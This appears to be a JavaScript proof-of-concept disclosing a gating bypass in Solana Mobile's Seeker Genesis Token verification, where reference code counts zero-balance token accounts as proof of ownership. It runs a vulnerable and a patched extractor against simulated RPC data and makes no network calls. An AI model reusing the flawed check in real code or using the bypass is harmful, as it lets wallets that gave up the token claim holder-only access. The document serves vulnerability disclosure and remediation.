// Proof-of-Concept: Zero-Balance Token Account Gating Bypass in Seeker Genesis Token (SGT)
// Target: Solana Mobile Seeker Genesis Token Verification Architecture
// Researcher: deviykee

const { PublicKey } = require('@solana/web3.js');

/**
 * Vulnerable extraction logic from official Solana Mobile reference:
 * skills/seeker-genesis-token/references/sgt-verification.md (Lines 95-108 & 156-161)
 */
function vulnerableExtractMintPubkeys(tokenAccounts) {
  return tokenAccounts
    .map((entry) => entry.account.data.parsed?.info?.mint)
    .filter(Boolean)
    .map((mint) => new PublicKey(mint));
}

/**
 * Fixed extraction logic filtering for non-zero balance:
 */
function patchedExtractMintPubkeys(tokenAccounts) {
  return tokenAccounts
    .filter((entry) => {
      const amount = entry.account?.data?.parsed?.info?.tokenAmount?.amount;
      return amount && amount !== '0';
    })
    .map((entry) => entry.account.data.parsed?.info?.mint)
    .filter(Boolean)
    .map((mint) => new PublicKey(mint));
}

// Simulated parsed RPC response for a wallet that previously owned an SGT but transferred it away.
// In Solana Token-2022, the Associated Token Account remains on-chain with amount = "0".
const mockTransferredSgtAta = [
  {
    pubkey: new PublicKey('4xKqN4iM7L2v1a8jD5m6P9nB8uT3yE1wV2zC4a5b6c7d'),
    account: {
      data: {
        parsed: {
          info: {
            mint: 'GT22s89nU4iWFkNXj1Bw6uYhJJWDRPpShHt4Bk8f99Te', // Genuine SGT Group Mint
            owner: '6vYnN4iM7L2v1a8jD5m6P9nB8uT3yE1wV2zC4a5b6c7d',
            state: 'initialized',
            tokenAmount: {
              amount: '0', // Zero balance (NFT was transferred out!)
              decimals: 0,
              uiAmount: 0,
              uiAmountString: '0'
            }
          }
        },
        program: 'spl-token-2022'
      }
    }
  }
];

console.log('=== SGT Verification Bypass PoC ===\n');

const vulnerableResult = vulnerableExtractMintPubkeys(mockTransferredSgtAta);
console.log('[1] Vulnerable Implementation Result:');
console.log('    Extracted Mints:', vulnerableResult.map(m => m.toBase58()));
console.log('    Evaluation: hasSGT = true (VULNERABLE - Zero-balance account accepted as device owner)\n');

const patchedResult = patchedExtractMintPubkeys(mockTransferredSgtAta);
console.log('[2] Patched Implementation Result:');
console.log('    Extracted Mints:', patchedResult.map(m => m.toBase58()));
console.log('    Evaluation: hasSGT = false (SECURE - Empty account correctly rejected)\n');

console.log('PoC execution completed successfully.');
